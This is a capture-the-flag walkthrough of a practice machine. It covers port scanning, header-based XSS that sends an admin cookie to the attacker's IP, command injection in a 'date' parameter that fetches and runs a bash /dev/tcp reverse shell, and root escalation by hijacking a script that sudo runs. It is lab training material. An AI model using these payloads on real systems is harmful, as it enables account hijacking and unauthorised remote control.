
Starting this machine, I am being given an IP address

I start with a `nmap` scan to enumerate the open ports
```shell
nmap -A -T4 10.10.11.8
```
![[Pasted image 20251005085501.png]]

The scan shows 2 open ports:
	- port 22 open for `ssh`
	- port 5000 open for a http server

Now that we have 2 open ports, I want to start checking the HTTP server on port 5000
![[Pasted image 20251005085650.png]]

- As seen above the first thing I am shown on the server is this Welcome message and a button for questions
- Pressing the `For questions` button I am redirected to a `/support` page where I can complete some contact information and send a message
![[Pasted image 20251005085849.png]]

- Completing and pressing the button `Submit` does nothing so maybe I can inject some malicious scripts through one of the boxes
- Trying to enter Python code or some sort of `SSTI` got me no results
- The next thing I tried was `XSS` with the next payload to see if I get any result
```
</scrip</script>t><img src =q onerror=prompt(8)>
```
![[Pasted image 20251005090853.png]]

- Guess what, I was prompted a `Hacking Attempt Detected` message
![[Pasted image 20251005091023.png]]

- Few things I can observe from this message:
	- The output shows the headers from the POST request I sent when submitting the XSS payload
	- At top of the message we also have the text `Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation`, which means that some admin account is going to investigate I believe the request Headers

- To check the fact that it shows all the request headers, I will use `burp suite` to modify the request with a new Header and see if it gets output on the screen
- I will send the  use a simple `Hello: 123` header
![[Pasted image 20251005092601.png]]
- As I can see the header is shown in the browser

- Another thing I want to try, is to put a script that will prompt `8`, inside that `Hello` request header
- I am going to use the same payload from above `</scrip</script>t><img src =q onerror=prompt(8)>`
![[Pasted image 20251005092931.png]]
- This also worked meaning that now we can start paying attention to the other fact about this server

- The other fact is that we are given the info that an report containing the request is sent to an admin
- So someone should verify these reports

- Before trying to send a new request I observed that the request contains a Cookie named `is_admin`
```HTTP
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
```
- That means that we could get somehow the cookie of the admin if the admin check the request

- So to check if my requests are getting checked I will send the next header
```HTTP
Hello: <img src=x onerror="var a=new Image;a.src='http://10.10.14.18:80/';">
```
- In the meantime I use `python3 -m http.server 80` to open a HTTP server on my machine
- After I send the request, I waited for a few seconds and I got a response, meaning that my response got checked
![[Pasted image 20251005151750.png]]

- I also checked on Internet how to get a cookie and I learned that I can get it with the `document.cookie` 
- So now I changed the request to:
```HTTP
Hello: <img src=x onerror="var a=new Image;a.src='http://10.10.14.18:80/'+document.cookie;">
```
- I sent the request, waited a few seconds and I got a cookie which I believe is from an admin
![[Pasted image 20251005152227.png]]

- Next I press CTRL+SHIFT+I and I go to `Application` and change the cookie to the new one `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`
- Nothing happened but using `burp suite` it showed me that there is another page located at `/dashboard`

- With this new cookie I can access this `/dashboard` page which outputs an `Administrator Dashboard`
![[Pasted image 20251005153159.png]]

Pressing the button `Generate Report` it sends a POST request to `/dashboard` with the parameter `date`
![[Pasted image 20251005153713.png]]
- The response does not differ very much, only that it shows an additional message `Systems are up and running!`

- Given the fact that I have nothing else to work with and the scope of this machine until now was to use injections I decided to use the parameter date for injections 

 - The message I received gave me an idea, that because it says the systems are up and running, this must come from a script inside the target machine, in essence a script run directly on the linux server
 - To check this I URL encoded the character `&` followed by `id;`, using the final value for the `date`parameter as:
	 - `date=%26id;`
- The response was surprisingly favorable for me, as the command worked indeed and I learned that the server was running as the `dvir` user
![[Pasted image 20251005155014.png]]

Next step is to get a reverse shell on the server and to do that I created a script `shell.sh` containing a one liner to get a reverse shell
```shell
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'
```
- Then I opened inside the same folder an HTTP server using python
```shell
python3 -m http.server 80
```
- In another terminal I started an `nc` listener on port `4444`
```shell
nc -lvnp 4444
```
- And finally I injected the following script to get the reverse shell
```HTTP
date=%26wget+http://10.10.14.18/shell.sh+%26bash+./shell.sh;
```
- The injection worked perfectly as I gained a shell as the `dvir` user and also found the flag in his home directory
![[Pasted image 20251005160037.png]]

## Root flag

Now that I got the user flag, next thing is to escalate my privileges to `root` user and get the system flag

- First thing I like to do is to check the output of the `sudo -l` command to see if I can run something with `root` privileges
![[Pasted image 20251005212118.png]]
- From the output I learn that I can run `sudo syscheck` which is not a default script

- Running the command `sudo syscheck` I get another information, that I need some database service running for the `syscheck` command to do something
![[Pasted image 20251005212423.png]]
- To see what Database service is needed I decided to check the content of the binary

- The binary can be found in the `/usr/bin` directory
![[Pasted image 20251005212719.png]]
- First part of the binary is kinda useless, but from the last part I learn that:
	- this database service is located in a script `initdb.sh`
	- the `initdb.sh` will be executed when running `sudo syscheck`
- From all these facts now I know what I have to do next

- I have to create a new script `initdb.sh` where I put a simple script to get a bash console as the `root` user

- First I create the `initdb.sh` file with the script inside
```shell
echo "/bin/bash" > ./initdb.sh
```
- Then I run the `sudo syscheck` command on it 
```shell
sudo syscheck
```
- Third thing is to enjoy the system shell and get the flag 
![[Pasted image 20251005214838.png]]
